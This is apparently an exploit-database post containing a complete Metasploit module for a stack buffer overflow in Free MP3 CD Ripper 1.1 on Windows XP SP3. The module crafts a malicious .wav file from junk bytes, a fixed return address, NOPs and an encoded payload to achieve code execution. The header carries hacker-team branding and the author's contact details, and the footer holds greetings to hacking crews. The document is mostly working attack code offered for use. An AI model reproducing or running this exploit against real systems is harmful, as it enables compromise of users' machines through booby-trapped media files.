1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : Free MP3 CD Ripper 1.1 Local Buffer Overflow Exploit (MSF)
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
# Home : Hassi.Messaoud (30008) - Algeria -(00213555248701)
# Web Site : www.1337day.com * www.exploit-id.com * sec4ever.com
# Facebook : http://facebook.com/KedAns
# platform : windows
# Impact : Local Buffer Overflow
# Tested on : Windows XP SP3 (en)
##

##
# $Id: freeripper_bof.rb  2011-09-02 03:03  KedAns-Dz $
##

require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::FILEFORMAT
 
   def initialize(info = {})
    super(update_info(info,
     'Name' => 'Free MP3 CD Ripper 1.1 Local Buffer Overflow Exploit',
	 'Description' => %q{
	  This module exploits a stack buffer overflow in version 1.1
	  creating a specially crafted .wav file, an attacker may be able 
      to execute arbitrary code.
	},
     'License' => MSF_LICENSE,
     'Author' => 
	   [
	    'X-h4ck', # Original
	    'KedAns-Dz <ked-h[at]hotmail.com>' # MSF Module
	    ],
     'Version' => 'Version 1.0',
     'References' =>
        [
         [ 'URL', 'http://exploit-db.com/exploits/17727' ],
        ],
    'DefaultOptions' =>
       {
        'EXITFUNC' => 'process',
       },
     'Payload' =>
      {
        'Space' => 1024,
        'BadChars' => "\x00\x0a\x0d",
        'StackAdjustment' => -3500,
      },
     'Platform' => 'win',
     'Targets' =>
       [
        [ 'Windows XP-SP3 (En)', { 'Ret' => 0x76B43ADC} ], # fdivr qword edx / mov ah,0x76
       ],
      'Privileged' => false,
      'DefaultTarget' => 0))
 
      register_options(
       [
        OptString.new('FILENAME', [ false, 'The file name.', 'msf.wav']),
       ], self.class)
    end
 
    def exploit

    sploit = rand_text_alphanumeric(4112) # Buffer Junk
      sploit << [target.ret].pack('V')
      sploit << make_nops(15)
      sploit << payload.encoded

      ked = sploit
      print_status("Creating '#{datastore['FILENAME']}' file ...")
      file_create(ked)

    end
 
end

#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]=====================================
# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > + Rizky Ariestiyansyah * Islam Caddy <3
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re * CrosS (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * SeeMe * XroGuE * ZoRLu * gunslinger_ 
# anT!-Tr0J4n * ^Xecuti0N3r * Kalashinkov3 (www.1337day.com/team) * Dz Offenders Cr3w * Sec4ever
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X
# Kha&miX * Str0ke * JF * Ev!LsCr!pT_Dz * H-KinG * www.packetstormsecurity.org * TreX (hotturks.org)
# www.metasploit.com * UE-Team & I-BackTrack * r00tw0rm.com * All Security and Exploits Webs ..
#=================================================================================================